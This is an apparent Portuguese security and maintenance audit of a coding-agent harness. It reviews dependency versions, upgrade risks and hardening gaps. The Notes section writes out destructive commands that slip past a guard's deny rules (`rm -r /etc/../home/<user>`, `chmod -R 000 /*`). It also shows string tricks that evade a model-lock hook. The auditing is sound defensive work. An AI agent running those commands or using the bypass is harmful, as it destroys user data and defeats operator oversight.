| mcpvault | 0.18.3 global, não pinado | 0.18.4 (2026-11-14) | Não avaliado | baixo | idem |
| Node mínimo | 22.19.0 (`install-lib.sh:8`) | LTS ativa v26.13.1 (2026-11-10); 22 em manutenção desde 2025-10-21, fim 2027-04-30 | Parcial: 22.19 é o piso de `engines` do pi/pi-code | baixo | – |
| Node no CI | `"24"` (`ci-static.yml:54`) | 26.13.1 (LTS ativa desde 2026-10-28); a 24 em manutenção desde 2026-10-20 | Sim (barra "LTS ativa mais nova"); a 26 remove `--experimental-transform-types` e o Corepack | médio | voltar `"24"` |
| Python no CI | 3.12 (`ci-static.yml:50,96`, `ci-security.yml:48`, `requirements-ci.in:3`) | 3.15.2 (2026-10-25); 3.14.10 também recebe correções | Parcial: 3.12 fora do bugfix, sem suporte em 2028-10 | médio (regenerar `requirements-ci.txt` com hashes) | voltar 3.12 |
| harden-runner | v2.22.4 | v2.23.0 (2026-11-18) | Não avaliado | baixo | SHA anterior |
| semgrep / diff-cover / biome | 1.185.0 / 11.0.1 / 2.6.7 | 1.186.0 / 11.0.4 / 2.6.8 | Não avaliado | baixo | pin anterior |
| Harbor (bench) | 0.25.0 (`bench/tasks/README.md:3`) | 0.26.0 (2026-11-13) | Changelog não lido; pode mudar o formato das tasks | médio | `uvx harbor==0.25.0` |
| `mcp.json.example` | 3 servidores via `npx -y` sem pin (playwright `@latest`) | perplexity 1.3.0, brave 2.1.5, playwright 0.0.86 | Sim: única superfície sem pin nem hash (ver S5) | baixo | – |
| checkout, setup-python, setup-node; ruff, mypy, zizmor, mutmut; actionlint, gitleaks, trufflehog, osv-scanner, shellcheck, shfmt, rg; coverage, pytest; npm audit do lock | atuais (npm audit: 0 vulnerabilidades) | iguais | Não | – | – |
| uv, `--experimental-strip-types` (docs) | só comentário / docs `docs/designs/*` | uv 0.13.9; a flag é desnecessária desde 22.18 | Cosmético | trivial | – |
| Claude Code do braço `cc-vanilla` | 2.1.323 (`bench/arms.toml:11`) | não verificado | – | – | – |

### (a) pi-code 1.7.0 → 1.10.1 e o pi upstream

- **1.8.0:** `CLAUDE_PROJECT_DIR` passa a ser o diretório de início da sessão, não a raiz do git (`guard.py:465` usa a
  variável como "project": revisar antes de subir); `updatedToolOutput` só vale sob `hookSpecificOutput` (nenhum hook
  local o usa); skills de plugin viram `/kit:deploy` e `/skill:x` fica deprecado; bash que estoura o timeout vai para
  segundo plano (com UI) em vez de morrer, o que pode interagir com `bash-timeout` (teto 1800 s); Esc/Enter mudam no
  `question`. Traz também bash em segundo plano (`task_stop`, `/tasks`), `monitor`, `piCode.enabledPlugins`,
  `autoMemoryStorage:"claude"`.
- **1.9.0:** linha "Chat about this" no `question`; corrige o contexto do SessionStart `compact`.
- **1.10.0:** `/goal` e hooks `prompt` usavam no máximo 512 tokens de saída (cortava o veredito); `/todos-widget
  off|compact|full`; skills sincronizadas da conta não entram como pessoais. **1.10.1:** refatoração interna.
- **pi core 1.5.1/1.5.2 (já em uso):** `cacheWarming` padrão `"idle"`; mensagens Anthropic em thread; fork de sessão com
  pasta ausente. O pi-code 1.6.2 corrigiu o undici do pi 1.1–1.4 (GHSA-xjj6-f33q-929c).
- **Patches locais (observado, cópias em `/tmp`, `patch -N` em ordem `LC_ALL=C`):** falham 4 na 1.7.0 (`status-names`,
  `icon-gap`, `plan-sota-and-fleet`, `plan-state`; podem ser artefato da ordenação, não confirmado), 9 na 1.9.0 (+
  `subagent-panel`, `onda5-hooks`, `onda5-question`, `question-view`, `question-dialog`) e 12 na 1.10.1 (+ `goal.patch`
  3 de 24 hunks, `onda5-goal`, `todo-collapse`). `permission-control/apply.mjs` e `bin/pi` recusam versão ≠ 1.7.0.
- **Hipóteses de obsolescência (não validadas):** `todo-collapse` frente a `/todos-widget`; o limite de tokens do
  `/goal` em `goal.patch` frente à correção da 1.10.0; a extensão local `run/` frente a bash em segundo plano e
  `monitor`; os patches de `question` frente à reescrita do formulário.

### (b) Decisões do harness frente à prática documentada

1. Subagentes aninhados até profundidade 3: coerente com o Claude Code (https://code.claude.com/docs/en/sub-agents).
2. MCP deferido: o pi-code 1.6.0 já difere atrás de `tool_search`; a API recomenda 3–5 ferramentas frequentes sem
   diferir
   e `mcp.json.example` não marca `alwaysLoad`; gap pequeno de latência, medição é do parent.
3. Cache de prompt: prefixo precisa ser estável (https://code.claude.com/docs/en/prompt-caching); patches que reescrevem
   o prompt (plan-mode, rules-notice) são risco **não medido**; TTL de 1 h no pi para chave de API **não verificado**.
4. Papel "somente leitura" de subagentes depende de disciplina de prompt e da lista `tools:`: o pi-code 1.7.0 carrega
agentes com escopo (`Bash(git log:*)`) como ferramenta inteira e ignora `permissionMode`/`hooks` de agentes de plugin.
   Dono: security-reviewer.
5. Hooks só do tipo `command`; o Claude Code documenta cinco tipos e o campo `if` (síntese Perplexity, só cabeçalhos
   da página lidos). Sem ganho medido a reivindicar.
6. `CLAUDE_PROJECT_DIR` no guard (`guard.py:465`): semântica mudou na 1.8.0; rodar `test_guard.py` antes de subir o pin.
7. Patches aplicados em `node_modules` na inicialização (`bin/pi:185-260`; 74 arquivos-alvo, 89 entradas em
   `patches/pi-code`): 4 releases em 2 dias, 12 falhas; o gate por versão falha fechado.
8. Modelo/esforço por spawn: alinhado ao Claude Code; trocar esforço no meio da sessão invalida o cache (efeito a
   medir).
9. `/skill:` deprecado para skills de plugin na 1.8.0; `claude-home/commands/*.md` usa `/skill:atualizador`
   (ex.: `commit-push-pr.md:10`); só quebra se virarem skills de plugin.
10. `npx -y …@latest` em `mcp.json.example` contradiz a política de `third-party.json` (tarball com sha512 e commit
    fixo).

### (c) O que não vale migrar agora

- pi core: já no último estável (1.5.2); a linha `legacy-node20` não serve.
- Node 26 como piso do instalador: pi e pi-code exigem ≥ 22.19; subir só exclui usuários. Mudar o CI para 26 é a ação
  barata; não subir o piso até o pi mudar `engines`.
- Python 3.15 no CI: ganho zero medido e linha nova; se subir, preferir 3.14.
- pi-code 1.7.0 → 1.10.1 de uma vez: custo alto, retorno incerto até refazer os 12 patches; ganho de segurança nulo
  (sem CVE, npm audit zerado). Adiar, triar o que o upstream já cobre e refazer só o resto.
- ponytail 5.x: major sem notas lidas. Harbor 0.26.0: só entre rodadas de benchmark.
- Remover `--experimental-strip-types` dos docs: cosmético.
- Atualizações pontuais (semgrep, diff-cover, biome, harden-runner, mcpvault, computer-use-linux): baixo risco, sem
  correção de segurança conhecida; agrupar numa passada de manutenção.

## Notas

Preferências, endurecimento e observações sem defeito demonstrado. Nada aqui entra na contagem do resumo.

- `guard.py:208`: o deny de `rm -r` não normaliza `..` (`rm -r /etc/../home/<user>`, `rm -r /usr/../usr` dão só ask);
  `chmod -R 000 /*` e `chmod -R 777 //` idem (`:223` testa `"/" in positional`). Normalizar com `normpath`/`realpath`
  antes de `CATASTROPHIC_RM` (seg). Parte coberta por D8 de `02`; a lista exata não consta em `02`.
- `guard.py`: `killall5` e `pkill -9 -u $USER` fora da lista de kill; `systemctl --force poweroff` já é negado (seg).
- `check_file` (Edit/Write legado) usa `abspath` sem `realpath`; no modo default/acceptEdits o `permissions/paths.py`
  resolve symlinks, então o impacto fica no ramo sem `PI_PERMISSION_MODE` (o wrapper sempre o define) (seg).
- `claude-home/bin/mcp-header.sh`: `$1` vem do `mcp.json` e não é validado; `../` sai de `claude-secrets/`; rejeitar
  `*/*` e `..` (seg; corrigido (U4)).
- `bash-clamp/index.ts:119`: `toolCallId` vindo do provedor entra em `join(logDir(), …)`; se trouxer `/` ou `..` há
  path traversal. Hipótese, não verificado como o pi-ai normaliza ids; sanitizar com `basename` ou `[\w-]` (nv; coberto
  por "id de tool call" em U2).
- `install.sh`/`install-lib.sh`: bem feitos (pins de commit e SHA-512, `--ignore-scripts`, STAGE verificado).
  `PI_HARNESS_API`
  e `PI_HARNESS_MANIFEST` do ambiente trocam a fonte; os hashes de pi continuam fixos, o manifesto trocado não é
  verificado (seg).
- Workflows: `pull_request` (não `_target`), `permissions: {}`, `persist-credentials: false`, actions por SHA,
  harden-runner com egress em `block`. `hook-dispatch.sh`: `eval "$fields"` com `@sh` é seguro; `timeout 3 bash -c
  "$HARNESS_LAUNCHER_CHECK"` só importa se o atacante controla o ambiente. `session-transport` usa `O_NOFOLLOW`,
  `mkstemp`, `argv` fixo (seg).
- `graph_context.py`: `git ls-files` em repo clonado sob `~/source` não executa `fsmonitor`, mas `codegraph init -y`
  roda
  o índice do repo no contexto do usuário (seg).
- `travar-modelos/index.ts:171`: o guard só bloqueia `bash`/`run` com a string literal `PI_MODEL_LOCK`; contorno trivial
  (`PI_MODEL_L""OCK`, `env -u`, script): se a trava é garantia, é só dissuasão (nv).
- `/tmp/pi-bash-clamp` em `/tmp` compartilhado: diretório pré-criado por outro usuário não é revalidado (ver F8).
- `pi-docs/index.ts`: `mode`, `weSet` e `text` são estado de módulo; o memo `text ??=` não é invalidado se o caminho dos
  docs mudar na sessão; `wantFull` lê `package.json` a cada prompt. Efeito pequeno (nv).
- Lógica de blocos de código duplicada em `dev-commands/copy-code.ts` e `claude-compat/commands/session/copy.ts`
  (a segunda já comenta): risco de divergência (nv).
- `diagnostico/exportar.ts:116`: se `filtro` lançar, o span vai à rede sem filtro (fail-open); hoje o filtro é um
  destructure que não lança (nv).
- `puxar.ts:18`: `SCRIPT` usa `os.homedir()/.pi/agent`, não `getAgentDir()`; com `PI_CODING_AGENT_DIR` diferente o
  `puxar.py` não é achado (o erro é notificado) (nv).
- `claude-compat/commands/agents/loop.ts`: `notify`/`idle` guardam o ctx do último `agent_settled`; hoje
  `session_shutdown` zera `st`, sem falha vista; frágil se a ordem do shutdown mudar (nv).
- `hud/claude-hud-pi-transcript.mjs`/`calm-statusline.mjs`: sem `setInterval` sem clear nas extensões revisadas; o
  relógio único de `motion.ts` e os `assinarQuadro` se desfazem sozinhos (ui).
- `pi.getCommands().some(...)` em `ui/editor.ts` (hasCommand) roda por tecla de `/x` e por submit; custo pequeno (ui).
- `plan-gate.ts:98-123`, `completion-gate.ts:78-98`, `auto-resume/index.ts:152-170` percorrem o ramo inteiro a cada
  `agent_before_settle` (O(entradas), ordem de ms em 2.000–5.000 entradas): não medido, nada a corrigir agora (pc 18).
- `gd_merge.py:140-150`: `gh pr merge` que estoura o prazo (rc 124) vira `gh_fail`, mas a reexecução é segura
  (`state == "MERGED"` e `--match-head-commit`): sem defeito, só a mensagem não distingue "timeout" de "recusado"
  (sugestão: `outcome_unknown, re-run`) (pc 13).
- `bench/runners.py:520-576`: S4/S5 em série e S1 com `jobs=2` fixo; o custo dominante é o modelo, ganho só de tempo de
  parede; opcional: executor com 2 workers (pc 23).
- Hipóteses rejeitadas por pc: checkpoints sem poda (poda de 30 dias existe); leitura de arquivos a cada chamada no
  `hook-dispatch` (PostToolUse 4,1 ms); retry sem limite no `auto-resume` (há teto); supervisor `/restart` (limites e
leitura estrita); locks/timeouts de `git-deliver`; `session-transport`. Rejeitados por nv: `pi.events.on` sem
  unsubscribe
  (pi 1.5.2 remove em `invalidate`, `loader.js:152`) e `onTerminalInput`/`addAutocompleteProvider` (limpos no reset).
- Um `kill -9` do wrapper deixa `pi-lifecycle.*` em `$XDG_RUNTIME_DIR`: cosmético (pc).
- Divergência entre faixas: logs cita o teto de `bash-timeout` em `:22`; conferido no código, é `:25` (`MAX_S = 1800`);
  a recusa em `:35` confere. `docs/perf-sota.md` também cita `:25`.

## Não verificado

Declarado pelas faixas (nada abaixo foi coberto):

- **seguranca:** corpo de `patches/*/apply.mjs`; `check-leaks.sh` (só grep); `scripts/ci/run-*.sh`; `hook-msgs`; resto
  de
  `claude-home/bin/session-transport/` além de grep; varredura mais ampla de variantes da causa-raiz de G1–G3 (pedida ao
  pai); S1 e o symlink de G7 não reproduzidos; `claude-compat` só por grep de `spawn`/`exec`/`tmp`.
- **extensoes-nao-visuais:** não leu por inteiro `claude-compat/vim/` (só `engine.ts` até a linha 260, `host.ts` e
  `ops.ts`
em trechos), `shortcuts`, `matrix`, `aliases`, `directory/`, `interface/` (só `transcript.ts`),
  `comandos/{atalhos,catalog,painel}`,
  `diagnostico/painel.ts`, `avisos/{painel,causa,turno}`. Só reproduziu F1 e F6 e o `Number("")` de F2; os demais vêm de
  leitura; crescimento de memória de F4 não medido.
- **extensoes-ui:** não leu `claude-compat/vim/*` nem `motion/nycode.ts` em profundidade; `claude-hud-antigravity.mjs`
  fora; `perf.mjs` e testes não rodaram; todos os custos "por frame" são estimativas por leitura, exceto 4 medições
(`toLocaleTimeString`, `toString`+`split` de 8 MB, `git status` 0,00 s, ausência de `blockHighlightedCode`); números de
  linha podem ter deslocado (`ui/editor.ts`, `ui-visual/motion/*`, `chat-margin` mudaram há poucas horas); U6 não
  confirmado (`doc.children[2]` × contêiner de `findChat`; teste: duas tools seguidas no mock e ver a linha em branco).
- **perf-confiabilidade:** nenhuma injeção de falha (B2, B3, B5, E1, F14 e o tamanho real das respostas MCP de G12
  dependem disso); importação das extensões pelo carregador do Node, não do pi (limite superior); `statusline.mjs` não
  executado (lê `auth.json` e faz rede; custo ~11 ms de Node + `git status` 6 ms é estimativa); `graph_context.py` com
  índice (~270 ms vem da docstring); comportamento do hook que estoura o timeout de 5 s depende do pi-code, não
  verificado; carga 7,1–10,1 durante as medições.
- **logs:** conteúdo de sessions e checkpoints; tokens de subagentes separados dos da sessão principal; origem exata do
  `$CLAUDE_CONFIG_DIR` literal; achados individuais do scan de skills; "48h" e "pós" dependem da janela de 3 dias.
- **testes:** nada executado (sem contagens de passed/failed/skipped/flaky); "sem teste" vem de busca por nome e
  importações indiretas podem esconder cobertura; algumas suítes "existem" sem os casos lidos linha a linha; sem
  codegraph.
- **atualidade:** notas e compatibilidade do ponytail v5.x e do pi-lsp 0.1.8 com os patches locais; changelogs de Harbor
  0.26, semgrep 1.186, harden-runner v2.23.0, computer-use-linux 0.7.54–0.7.56 e mcpvault 0.18.4; versão atual do
  `@modelcontextprotocol/sdk` (lock em 1.32.2) e do Claude Code do braço `cc-vanilla`; páginas do pi upstream sobre
  extensões e pacotes; hooks de `agent`/`prompt`/`http` do Claude Code só via Perplexity; versões de LSP (ex.:
  typescript-language-server 6.0.3 → 6.1.0) só no scanner, sem fonte primária; medições de desempenho e exploração de
  segurança ficam com o parent e o security-reviewer.
- **Esta compilação:** não rodou testes nem comandos dos relatórios; conferiu no código só `bash-timeout/index.ts:25-35`
  e `ui-visual/tools.ts:156`. Os demais `arquivo:linha` vêm dos relatórios e podem ter deslocado (árvore suja com
  trabalho alheio).
